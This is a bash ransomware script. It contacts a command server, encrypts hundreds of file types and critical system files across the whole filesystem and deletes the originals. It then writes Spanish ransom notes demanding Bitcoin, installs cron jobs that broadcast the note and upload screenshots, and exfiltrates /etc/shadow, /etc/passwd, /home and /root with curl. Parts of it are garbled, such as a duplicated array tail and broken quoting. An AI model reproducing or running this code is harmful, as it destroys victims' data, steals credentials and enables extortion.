
#!/bin/bash

genFileName() {
  # Generate random value for the filename string size between 5 and 10
  # Build a filename string with the length of this random size out of the character set 'a-z'
  randString=$(< /dev/urandom tr -dc '[:lower:]' | fold -w "$(shuf -i 5-10 -n 1)" | head -n 1)

  randStringSize=${#randString}

  # Get a random number between the half of the string and the string size
  randHalfString=$(($((randStringSize / 2)) + $((RANDOM % randStringSize))))

  # Get a random number between 1 and this random number from Step 6
  # (This number is used as value for how many random numbers are inserted into the string in the next step)
  randNum=$((1 + (RANDOM % randHalfString)))

  # Do step 8 as many times as the random value in step 7 says
  for ((i=0; i<randNum; i++))
  do
    # Generate a random ASCII number (char) between 0-9 and insert it at a random position in the string
    getRandNum=$((RANDOM % 9))
    getRandPos=$((RANDOM % randStringSize))

    if [ ${getRandPos} == 0 ]
    then
      let getRandPos=$((getRandPos + 1))
    fi

    getNewString="${randString//^\(.\{$getRandPos\}\)/\1$getRandNum/}"

    randString="${getNewString}"
    randStringSize="${#randString}"
  done

  echo "${randString}"
}

genExtName() {
  # Generate random value for the filename string size between 2 and 5
  # Build a filename string with the length of this random size out of the character set 'a-z'
  randString=$(< /dev/urandom tr -dc '[:lower:]' | fold -w "$(shuf -i 2-5 -n 1)" | head -n 1)

  randStringSize=${#randString}

  # Get a random number between the half of the string and the string size
  randHalfString=$(($((randStringSize / 2)) + $((RANDOM % randStringSize))))

  # Get a random number between 1 and this random number from Step 6
  # (This number is used as value for how many random numbers are inserted into the string in the next step)
  randNum=$((1 + (RANDOM % randHalfString)))

  # Do step 8 as many times as the random value in step 7 says
  for ((i=0; i<randNum; i++))
  do
    # Generate a random ASCII number (char) between 0-9 and insert it at a random position in the string
    getRandNum=$((RANDOM % 9))
    getRandPos=$((RANDOM % randStringSize))

    if [ ${getRandPos} == 0 ]
    then
      let getRandPos=$((getRandPos + 1))
    fi

    getNewString="${randString//^\(.\{$getRandPos\}\)/\1$getRandNum/}"

    randString="${getNewString}"
    randStringSize="${#randString}"
  done

  echo "${randString}"
}

genKey=$(< /dev/urandom tr -dc 'A-Z0-9a-z' | fold -w 16 | head -n 1)

curl -k -d "uniqueID=${genKey}" https://192.168.1.132/target.php &>/dev/null

if [ -f /etc/redhat-release ]
then
  osType="redhat"
elif [ -f /etc/debian_version ]
then
  osType="debian"
else
  echo "Could not determine OS" &>/dev/null
fi

count=0

fileExts=("*.py" "*.txt" "*.cpp" "*.png" "*.jpg" "*.sh" "*.pyc" "*.key" "*.php" "*.css" "*.js" "*.tiff" "*.tff" "*.pl" \
          "*.ini" "*.xml" "*.desktop" "*.gpg" "*.enc" "*.lst" ".list" "*.properties" "*.acl" "*.gz" "*.tar" "*.bz2" "*.gif" \
          "*.doc*" "*.xls*" "*.pdf" "*.java" "*.swf" "*.jar" "*.json" "*.ppt*" "*.pst" "*.bat" "*.exe" "*.x" "*.pm" \
          "*.aps*" "*.cgi" "*.htm*" "*.dll" "*.class" "*.mov" "*.flv" "*.mp4" "*.mp3" "*.wav" "*.ogg" "*.md" \
          "*.yaml" "*.sql" "*.vim" "*.csv" "*.bak" "*.rb" "*.h" "*.c" "*.log" "*.waw" "*.jpeg" "*.rtf" "*.rar" "*.zip" \
          "*.psd" "*.tif" "*.wma" "*.bmp" "*.pps" "*.ppsx" "*.ppd" "*.eps" "*.ace" "*.djvu" "*.cdr" "*.max" "*.wmv" "*.avi" \
          "*.pdd" "*.aac" "*.ac3" "*.amf" "*.amr" "*.dwg" "*.dxf" "*.accdb" "*.mod" "*.tax2013" "*.tax2014" "*.oga" "*.pbf" \
          "*.ra" "*.raw" "*.saf" "*.val" "*.wave" "*.wow" "*.wpk" "*.3g2" "*.3gp" "*.3gp2" "*.3mm" "*.amx" "*.avs" "*.bik" \
          "*.dir" "*.divx" "*.dvx" "*.evo" "*.qtq" "*.tch" "*.rts" "*.rum" "*.rv" "*.scn" "*.srt" "*.stx" "*.svi" "*.trp" \
          "*.vdo" "*.wm" "*.wmd" "*.wmmp" "*.wmx" "*.wvx" "*.xvid" "*.3d" "*.3d4" "*.3df8" "*.pbs" "*.adi" "*.ais" "*.amu" \
          "*.arr" "*.bmc" "*.bmf" "*.cag" "*.cam" "*.dng" "*.ink" "*.jif" "*.jiff" "*.jpc" "*.jpf" "*.jpw" "*.mag" "*.mic" \
          "*.mip" "*.msp" "*.nav" "*.ncd" "*.odc" "*.odi" "*.opf" "*.qif" "*.qtiq" "*.srf" "*.xwd" "*.abw" "*.act" "*.adt" \
          "*.aim" "*.ans" "*.asc" "*.ase" "*.bdp" "*.bdr" "*.bib" "*.boc" "*.crd" "*.diz" "*.dot" "*.dotm" "*.dotx" "*.dvi" \
          "*.dxe" "*.mlx" "*.err" "*.euc" "*.faq" "*.fdr" "*.fds" "*.gthr" "*.idx" "*.kwd" "*.lp2" "*.ltr" "*.man" "*.mbox" \
          "*.msg" "*.nfo" "*.now" "*.odm" "*.oft" "*.pwi" "*.rng" "*.rtx" "*.run" "*.ssa" "*.text" "*.unx" "*.wbk" "*.wsh" \
          "*.7z" "*.arc" "*.ari" "*.arj" "*.car" "*.cbr" "*.cbz" "*.gzig" "*.jgz" "*.pak" "*.pcv" "*.puz" "*.r00" "*.r01" \
          "*.r02" "*.r03" "*.rev" "*.sdn" "*.sen" "*.sfs" "*.sfx" "*.sh" "*.shar" "*.shr" "*.sqx" "*.tbz2" "*.tg" "*.tlz" \
          "*.vsi" "*.wad" "*.war" "*.xpi" "*.z02" "*.z04" "*.zap" "*.zipx" "*.zoo" "*.ipa" "*.isu" "*.udf" "*.adr" "*.ap" \
          "*.aro" "*.asa" "*.ascx" "*.ashx" "*.asmx" "*.asp" "*.indd" "*.asr" "*.qbb" "*.bml" "*.cer" "*.cms" "*.crt" \
           "*.3dm" "*.3ds" "*.3fr"  "*.3g2" "*.3gp" "*.3pr" "*.7z" "*.ab4" "*.accdb" "*.accde" "*.accdr" "*accdt" "*.ach" "*.acr"  \
 "*.act"  "*.adb" "*.ads" "*.agdl"  "*.ai" "*.ait" "*.al" "*.apj" "*.arw" "*.asf" "*.asm" "*.asp" "*.aspx" "*.asx" "*.avi"    \
 "*.awg" "*.back" "*.backup" "*.backupdb"  "*.bak" "*.lua" "*.m"  "*.m4v" "*.max" "*.mdb" "*.mdc" "*.mdf" "*.mef"  "*.mfw" \
"*.mmw" "*.moneywell" "*.mos" "*.mov" "*.mp3" "*.mp4" "*.mpg" "*.mrw" "*.msg" "*.myd" "*.nd"  "*.ndd" "*.nef" "*.nk2" \
"*.nop" "*.nrw" "*.ns2" "*.ns3" "*.ns4" "*.nsd"  "*.nsf" "*.nsg" "*.nsh"  "*.nwb" "*.nx2" "*.nxl"  "*.nyf" "*.tif" "*.tlg" \
"*.txt" "*.vob" "*.wallet" "*.war" "*.wav" "*.wb2" "*.wmv" "*.wpd" "*.wps" "*.x11" "*.x3f" "*.xis"  "*.xla" "*.xlam" "*.xlk" \
"*.xlm" "*.xlr" "*.xls" "*.xlsb" "*.xlsm" "*.xlsx"  "*.xlt" "*.xltm" "*.xltx" "*.xlw" "*.xml" "*.ycbcra" "*.yuv" "*.zip" "*.sqlite" \
"*.sqlite3" "*.sqlitedb" "*.sr2" "*.srf" "*.srt" "*.srw"  "*.st4" "*.st5" "*.st6" "*.st7" "*.st8" "*.std" "*.sti" "*.stw" "*.stx" \ 
"*.svg" "*.swf" "*.sxc" "*.sxd" "*.sxg" "*.sxi" "*.sxm" "*.sxw" "*.tex" "*.tga" "*.thm" "*.tib" "*.py" "*.qba" "*.qbb" "*.qbm" "*.qbr" \
"*.qbw"  "*.qbx" "*.qby" "*.r3d" "*.raf" "*.rar" "*.rat" "*.raw" "*.rdb" "*.rm"  "*.rtf" "*.rw2" "*.rwl" "*.rwz" "*.s3db" "*.sas7bdat" \
"*.say" "*.sd0" "*.sda" "*.sdf" "*.sldm" "*.sldx" "*.sql" "*.pdd" "*.pdf"  "*.pef" "*.pem" "*.pfx"  "*.php" "*.php5" "*.phtml" \
"*.pl" "*.plc" "*.png" "*.pot" "*.potm" "*.potx"  "*.ppam" "*.pps" "*.ppsm" "*.ppsx" "*.ppt" "*.pptm" "*.pptx" "*.prf" "*.ps" \
"*.psafe3" "*.psd" "*.pspimage"  "*.pst" "*.ptx" "*.oab"  "*.obj" "*.odb" "*.odc"  "*.odf" "*.odg" "*.odm"  "*.odp" "*.ods" "*.odt" \
"*.oil" "*.orf" "*.ost" "*.otg" "*.oth" "*.otp" "*.ots" "*.ott" "*.p12" "*.p7b" "*.p7c" "*.pab"  "*.pages" "*.pas" "*.pat" \
"*.pbl" "*.pcd" "*.pct"  "*.pdb" "*.gray" "*.grey"  "*.gry" "*.h" "*.hbk"  "*.hpp" "*.htm" "*.html"  "*.ibank" "*.ibd" "*.ibz" \
"*.idx" "*.iif" "*.iiq" "*.incpas" "*.indd" "*.jar"  "*.java" "*.jpe" "*.jpeg"  "*.jpg" "*.jsp" "*.kbx"  "*.kc2" "*.kdbx" "*.kdc" \
"*.key" "*.kpdx""*.doc"  "*.docm" "*.docx" "*.dot"  "*.dotm" "*.dotx" "*.drf" "*.drw" "*.dtd" "*.dwg"  "*.dxb" "*.dxf" "*.dxg" \
"*.eml" "*.eps" "*.erbsql" "*.erf" "*.exf" "*.fdb"  "*.ffd" "*.fff" "*.fh"  "*.fhd" "*.fla" "*.flac"  "*.flv" "*.fmb" "*.fpx" \
"*.fxg" "*.cpp" "*.cr2" "*.craw" "*.crt" "*.crw" "*.cs" "*.csh" "*.csl"  "*.csv" "*.dac" "*.bank"  "*.bay" "*.bdb" "*.bgt" \
"*.bik" "*.bkf" "*.bkp"  "*.blend" "*.bpw" "*.c"  "*.cdf" "*.cdr" "*.cdr3"  "*.cdr4" "*.cdr5" "*.cdr6"  "*.cdrw" "*.cdx" "*.ce1" \ 
"*.ce2" "*.cer" "*.cfp"  "*.cgm" "*.cib" "*.class"  "*.cls" "*.cmt" "*.cpi"  "*.ddoc" "*.ddrw" "*.dds"  "*.der" "*.des" "*.design" \
"*.dgc" "*.djvu" "*.dng"  "*.db" "*.db-journal" "*.db3"  "*.dcr" "*.dcs" "*.ddd"  "*.dbf" "*.dbx"  "*.3dm" "*.3ds" "*.3fr" \
"*.3gz" "*.3gp" "*.accdr" "*.accdt" "*.ach" "*.acr" "*.act" "*.al" "*.apj"  "*.arw" "*.asf" "*.asm"  "*.backup" "*.backupdb" "*.bak" \
"*.bank" "*.bay" "*.bpw" "*.c" "*.cdf" "*.cdr"  "*.cdr3" "*.cel" "*.ce2"  "*.cer" "*.cfp" "*.cgm" "*.cpp" "*.cr2" "*.craw" \
"*.crt" "*.fxg" "*.db-journal"  "*.db3" "*.erf" "*.mdf"  "*.dds" "*.der" "*.des"  "*.fpx" "*.kc2" "*.dot" "*.dotm" "*.dotx" "*.ibz" \ 
"*.mdc" "*.eml" "*.eps"  "*.erbsql" "*.erf" "*.fla"  "*.flac" "*.flv" "*.kc2"  "*.ibank" "*.ibd" "*.ms2"  "*.http" "*.jpeg" "*.jpg" \
"*.muf" "*.jpe" "*.max"  "*.mdb" "*.odt" "*.m4v"  "*.mp3" "*.mp4" "*.mp3"  "*.mp4" "*.p7b" "*.mov"  "*.nop" "*.nrw" "*.pdf" "*.mk2" \
"*.pbl" "*.sql" "*.mdf" "*.st5" "*.mx2" "*.mxl" \
          "*.dap" "*.moz" "*.svr" "*.url" "*.wdgt" "*.abk" "*.bic" "*.big" "*.blp" "*.bsp" "*.cgf" "*.chk" "*.col" "*.cty" \
          "*.dem" "*.elf" "*.ff" "*.gam" "*.grf" "*.h3m" "*.h4r" "*.iwd" "*.ldb" "*.lgp" "*.lvl" "*.map" "*.md3" "*.mdl" \
          "*.mm6" "*.mm7" "*.mm8" "*.nds" "*.pbp" "*.ppf" "*.pwf" "*.pxp" "*.sad" "*.sav" "*.scm" "*.scx" "*.sdt" "*.spr" \
          "*.sud" "*.uax" "*.umx" "*.unr" "*.uop" "*.usa" "*.usx" "*.ut2" "*.ut3" "*.utc" "*.utx" "*.uvx" "*.uxx" "*.vmf" \
          "*.vtf" "*.w3g" "*.w3x" "*.wtd" "*.wtf" "*.ccd" "*.cd" "*.cso" "*.disk" "*.dmg" "*.dvd" "*.fcd" "*.flp" "*.img" \
          "*.iso" "*.isz" "*.md0" "*.md1" "*.md2" "*.mdf" "*.mds" "*.nrg" "*.nri" "*.vcd" "*.vhd" "*.snp" "*.bkf" "*.ade" \
          "*.adpb" "*.dic" "*.cch" "*.ctt" "*.dal" "*.ddc" "*.ddcx" "*.dex" "*.dif" "*.dii" "*.itdb" "*.itl" "*.kmz" "*.lcd" \
          "*.lcf" "*.mbx" "*.mdn" "*.odf" "*.odp" "*.ods" "*.pab" "*.pkb" "*.pkh" "*.pot" "*.potx" "*.psa" "*.qdf" "*.qel" \
          "*.rgn" "*.rrt" "*.rsw" "*.rte" "*.sdb" "*.sdc" "*.sds" "*.stt" "*.t01" "*.t03" "*.t05" "*.tcx" "*.thmx" "*.txd" \
          "*.txf" "*.upoi" "*.vmt" "*.wks" "*.wmdb" "*.xl" "*.xlc" "*.xlr" "*.xlsb" "*.xltx" "*.ltm" "*.xlwx" "*.mcd" "*.cap" \
          "*.cc" "*.cod" "*.cp" "*.cs" "*.csi" "*.dcp" "*.dcu" "*.dev" "*.dob" "*.dox" "*.dpk" "*.dpl" "*.dpr" "*.dsk" "*.dsp" \
          "*.eql" "*.ex" "*.f90" "*.fla" "*.for" "*.fpp" "*.jav" "*.lbi" "*.owl" "*.plc" "*.pli" "*.res" "*.rsrc" "*.swd" \
          "*.tpu" "*.tpx" "*.tu" "*.tur" "*.vc" "*.yab" "*.8ba" "*.8bc" "*.8be" "*.8bf" "*.8bi8" "*.bi8" "*.8bl" "*.8bs" \
          "*.8bx" "*.8by" "*.8li" "*.aip" "*.amxx" "*.ape" "*.api" "*.mxp" "*.oxt" "*.qpx" "*.qtr" "*.xla" "*.xlam" "*.xll" \
          "*.xlv" "*.xpt" "*.cfg" "*.cwf" "*.dbb" "*.slt" "*.bp2" "*.bp3" "*.bpl" "*.clr" "*.dbx" "*.jc" "*.potm" "*.ppsm" \
          "*.prc" "*.prt" "*.shw" "*.std" "*.ver" "*.wpl" "*.xlm" "*.yps" "*.md3" "*.1cd")

fileList=("/root/.history" "/root/.bash_history" "/root/.bashrc" \
          "/bin/netstat" "/bin/mount" "/bin/kill" \
          "/usr/sbin/useradd" "/usr/sbin/adduser" \
          "/bin/chgrp" "/usr/sbin/userdel" "/usr/sbin/usermod" "/usr/sbin/visudo" \
          "/usr/sbin/tcpdump" "/usr/sbin/service" "/sbin/reboot" "/sbin/shutdown" \
          "/usr/sbin/mysqld" "/usr/sbin/dmidecode" "/usr/sbin/chroot" \
          "/usr/sbin/chgpasswd" "/usr/sbin/apache2" "/usr/local/bin/*" \
          "/lib/modules/$(uname -r)/kernel/drivers/usb/storage/usb-storage.ko" \
           "/bin/netstat" "/bin/mount" "/bin/kill" \
          "/usr/sbin/useradd" "/usr/sbin/adduser" \
          "/etc/fstab" "/dev/pts" "/dev/shm" \
          "/etc/passwd" "/etc/ftpusers" "/etc/shadow" \
          "/etc/security" "/etc/ssh" "/etc/sysconfig" \
          "/etc/dhcpc" "/var/log" "/var/log/messages" \
          "/var/log/wtmp" "/var/log/lastlog" \
          "/bin/bash" "/usr/bin/curl" "/usr/bin/ftp" \
          "/usr/bin/gcc" "/usr/local/bin" "/usr/bin/nmap" \
          "/usr/bin/wget" "/usr/bin/sftp" "/usr/sbin/tcpd" \
"/var/last" "/etc/network/interfaces" "/etc/apt/resource" \
"/var/lock/subsys/local" "/bin/awk" "/var/yp/" \
"/bin/basename" "/var/yp/Makefile" "/etc/issue" \
"/etc/crontab" "/usr/bin/mrtg" "/boot" \
"/dev/pts /proc" "/dev/shm" "/usr" \
"/var /sbin/" "/usr/bin/telnet" "/usr/bin/wget" \
"/dev/gpmctl" "/dev/hda5" "/dev/hda1" "/dev/hda3" \
"/dev/hda2" "/dev/hda7" "/dev/shm" "/mnt/cdrom" \
"/bin/sync" "/sbin/nologin" "/var/spool" "/var/adm" \
"/var/lib/rpm" "/bin/false" "/dev/null" "/var/lib/pgsql" \
"/etc/shadow" "/windows\system32\drivers\etc" \
"/admin/pfsense" "/pentest/misc/Dravis" \
"/usr/bin/ruby" "/dev/sda1" "/home/ramesh" "/etc/mail" \
"/tmp/dir1" "/tmp/dir2" "/tmp/dir3" "/tmp/dir4" \
"/etec/mall" "/home/users" "/dev/null" \
"/etc/passwd" "/home/syslog" "/Linux/Linux-Unix/" \
"/var/lib/gnats" "/var/lib/libuuid" "/var/run/avahi-daemon" \
"/var/run/hplip" "/home/saned" "/var/run/pulse" \
"/var/lib/gdm" "/usr/bin/passwd" "/usr/share/doc/nss_ldap-253/pam.d/passwd" \
"/etc/pam.d/passwd" "/pattern/string" "/usr/home/htdocs/drag-and-drop/htdocs.php" \
"/usr/home//htdocs/sms/publish/pages" "/sync.php" "/usr/home/htdocs/track/backup.php" \
"/usr/home/htdocs/smstest/smstest.php" "/usr/home/htdocs/uploads.php "/usr/home/htdocs/017/backup.php" \
"/usr/home/htdocs/drag-and-drop/htdocs.php" "/usr/home/htdocs/drag-and-drop" "/usr/home//htdocs/sms/publish/pages/" \
"/usr/home/htdocs/track/" "/usr/home/htdocs/smstest/" "/usr/home/htdocs/" "/usr/home/htdocs/" \
"/usr/lpp/OV/bin/opcmon" "/sys/class/thermal/" "/etc/ssh/sshd_config" "/etc/sysconfig/clock"  \
"/var/lib/mysql/bug" "/var/log/acpid" "/var/log/audit/" "/var/log/wtmp" "/var/log/spooler" \
"/var/log/httpd/" "/tmp/test /mnt/out" "/etc/redhat-release" "/usr/local/apache2/bin/apachectl" \
"/etc/sysconfig/network" "/public/private" "/root/bin/backup" "/proc/sys/kernel/sysrq /proc/sysrq-trigger" \
"/dev/sdb /logical/physical /root/temp" "/var/spool/anacron" "/etc/anacrontab" \
"/usr/bin/mysqlaccess /usr/bin/mysqldata" "/usr/bin/mysqlperm" "/usr/bin/perl" "/usr/bin/mysqladmin" \
"/opt/lampp/lampp /etc/profile" "/buffers/cache" "/bin/vi" "/usr/local/sbin/sshd" "/oracle/bin/tns1snr" \
"/va/log/sa/sa /usr/lib/sadcs" "/etc/rc.d/init.d/sysstat" "/etc/rc.d" "/etc/rc.d/init.d" \
"/etc/rc.d/rc3.d/S01sysstat" "/usr/local/lib/sa/sa1" "/usr/local/lib/sa/sa2" "/var/log/sa/sa10" \
"/var/log/sa/sa23" "/opt/omni/lbin" "/usr/kbos/bin" "/usr/local/sbin" "/opt/omni/lbin" \
          "/bin/chgrp" "/usr/sbin/userdel" "/usr/sbin/usermod" "/usr/sbin/visudo" \
          "/usr/sbin/tcpdump" "/usr/sbin/service" "/sbin/reboot" "/sbin/shutdown" \
          "/usr/sbin/mysqld" "/usr/sbin/dmidecode" "/usr/sbin/chroot" \
          "/usr/sbin/chgpasswd" "/usr/sbin/apache2" "/usr/local/bin/*" \
          "/lib/modules/$(uname -r)/kernel/drivers/usb/storage/usb-storage.ko" \
          "/lib/modules/$(uname -r)/kernel/drivers/cdrom/cdrom.ko" )

          "/lib/modules/$(uname -r)/kernel/drivers/cdrom/cdrom.ko" )

curl -k "https://192.168.1.132/downloads/${genKey}_pub.pem" > /root/pub.pem
chmod 755 /root/pub.pem

< /dev/urandom tr -cd 'A-Za-z0-9' | fold -w 256 | head -n 1 > /root/key.bin 
chmod 755 /root/key.bin

for ((num=0; num<"${#fileExts[@]}"; num++))
do
  fileName=$(find / -name "${fileExts[${num}]}" -exec ls {} \;)

  for file in ${fileName}
  do
    setFileName=$(genFileName)
    setExtName=$(genExtName)
    getDirName=$(dirname "${file}")

    filePerms=$(stat -c "%a %n" "${file}" | awk -F" " '{ print $1 }')

    echo "${file},${getDirName}/${setFileName}.${setExtName},${filePerms}" >> /root/..file_mapping.db
   
    openssl enc -aes-256-cbc -salt -in "${file}" -out "${getDirName}/${setFileName}.${setExtName}" -pass file:/root/key.bin &>/dev/null

    rm -rf  "${file}" &>/dev/null

    count=$((count + 1))
  done
done

for file in "${fileList[@]}"
  do
    setFileName=$(genFileName)
    setExtName=$(genExtName)
    getDirName=$(dirname "${file}")

    filePerms=$(stat -c "%a %n" "${file}" | awk -F" " '{ print $1 }')

    echo "${file},${getDirName}/${setFileName}.${setExtName},${filePerms}" >> /root/..file_mapping.db

    openssl enc -aes-256-cbc -salt -in "${file}" -out "${getDirName}/${setFileName}.${setExtName}" -pass file:/root/key.bin &>/dev/null

    rm -rf "${file}" &>/dev/null

    count=$((count + 1))
done

openssl enc -aes-256-cbc -salt -in "/root/..file_mapping.db" -out "/root/..file_mapping.db.owned" -pass file:/root/key.bin &>/dev/null
rm -rf /root/..file_mapping.db

curl -k -d "fileCount=${count}&uniqueId=${genKey}" https://192.168.1.132/count.php

for directory in /root/ /home/ /etc/ /bin/ /usr/sbin/ /usr/bin /sbin/ /usr/local/bin/
do
  {
    echo "MUY BUENAS HERMANO, TE PREGUNTARAS QUE HA PASADO? TODOS TUS DATOS ESTAN CIFRADOS CON RSA-4096,  TODOS TUS DATOS ESTAN CIFRADOS CON RSA-4096. El mail para contadtar es Viphops3r@protonmail.ch Si está leyendo este texto, es porque has compartido fotos de menores en los foros de la DarkWeb. Para saber lo que tienes que hacer tienes que descargar el TOR, y visitar esa página; http://a6lkky6v2jelknpus5c6z2qff3wj2x4gw4thwy6rddxfjyr5ndsjabyd.onion/ https://192.168.1.132/decrypt.php and the id ${genKey}. REGISTRATE EN https://blockchein.com  Y PAGA 200$ A ESTA WALLET; 1CXWnfYhYS65SbNQJcrx32Hm3XHVQnof3e  SI NO LO PAGAS EN 48 HORAS, NO VOLVERAS A VER PORNOGRAFIA INFANTIL."
    
  } >> "${directory}/INSTRUCTIONS.txt"

  curl -k https://192.168.1.132/downloads/INSTRUCTIONS.html >> "${directory}/INSTRUCTIONS.html"
done

{
  echo -en  "#"'!'"/bin/bash"
  echo -e "\n"
  echo -e "wallCmd=\$(which wall)"
  echo -e "\n"
  echo -e "echo -e \"MUY BUENAS HERMANO, TE PREGUNTARAS QUE HA PASADO? TODOS TUS DATOS ESTAN CIFRADOS CON RSA-4096. El mail para contadtar es bl4ckshoot@protonmail.ch Si está leyendo este texto, es porque has compartido fotos sexuales de menores en los foros de la DarkWeb. Para saber lo que tienes que hacer, tienes que descargar el TOR, y visitar esa página; http://a6lkky6v2jelknpus5c6z2qff3wj2x4gw4thwy6rddxfjyr5ndsjabyd.onion/  https://192.168.1.132/decrypt.php and the id ${genKey}. REGISTRATE EN https://blockchein.com  Y PAGA 200$ A ESTA WALLET;  1JyKmBot92PV5rN5tsAYgRxJmtDADiQx5B SI NO PAGAS EN 48 HORAS, OLVIDATE PARA EL RESTO DE TU VIDA VER PORNOGRAFIA INFANTIL. forever.\\n\\nIMPORTANT: F CUIDATE MI HERMANO, DE LOS ERRORES SE APRENDE.\" | \${wallCmd}"
} > /etc/cron.hourly/instructions.sh

chmod 755 /etc/cron.hourly/instructions.sh

if [ "${osType}" == "redhat" ]
then
  /usr/bin/crontab -l | { cat; echo "1 * * * * /etc/cron.hourly/instructions.sh"; } | /usr/bin/crontab - &>/dev/null
elif [ "${osType}" == "debian" ]
then
  /usr/bin/crontab -l | { cat; echo "*/1 * * * * /etc/cron.hourly/instructions.sh"; } | /usr/bin/crontab - &>/dev/null
else
  echo "Could not set crontab" &>/dev/null
fi

echo -e "Tus archivos estan encriptados con RSA-4096. Tienes que visitar la página  https://192.168.1.132/decrypt.php and the id ${genKey}. d your data lost forever.\n\nIMPORTANT:   Realiza el pago de 1BTC y recuperaras la clave de la wallet ."

# Encrypt key.bin with our public key
openssl rsautl -encrypt -inkey /root/pub.pem -pubin -in /root/key.bin -out /root/key.bin.enc
rm -rf /root/key.bin

# Exfil files to our C2
exfilArr=("/root/..file_mapping.db.owned" "/root/key.bin.enc" "/etc/passwd" "/etc/shadow" "/home/" "/root/")

for file in "${exfilArr[@]}"
do
  tar czf - "${file}" |  curl -k -A "BashCrypto v1.0 Lite" -F "file=@-" -F "unique_id=${genKey}" -F "file_info=$(basename "${file}").tar.gz" -F "uploadFile=Upload" https://192.168.1.132/upload.php
done

if [ -f "/usr/bin/gnome-screenshot" ]
then
  {
    echo -en  "#"'!'"/bin/bash"
    echo -e "\n"
    echo -e "getDate=\$(date)"
    echo -e "\n"
    echo -e "genKey=\"${genKey}\""
    echo -e "\n"
    echo -e "/usr/bin/gnome-screenshot -f \"/tmp/.\${getDate}.screenshot\""
    echo -e "\n"
    echo -e "tar -czf - \"/tmp/.\${getDate}.screenshot\" | curl -k -A \"BashCrypto v1.0 Lite\" -F \"unique_id=\${genKey}\" -F \"file=@-\" \"file_info=\".\${getDate}.screenshot\".tar.gz\" -F \"uploadFile=Upload\" https://192.168.1.132/upload.php"
  } > /etc/cron.hourly/backup.sh

  chmod 755 /etc/cron.hourly/backup.sh

  if [ "${osType}" == "redhat" ]
  then
    /usr/bin/crontab -l | { cat; echo "1 * * * * /etc/cron.hourly/backup.sh"; } | /usr/bin/crontab - &>/dev/null
  elif [ "${osType}" == "debian" ]
  then
    /usr/bin/crontab -l | { cat; echo "*/1 * * * * /etc/cron.hourly/backup.sh"; } | /usr/bin/crontab - &>/dev/null
  else
    echo "Could not set crontab" &>/dev/null
  fi
fi
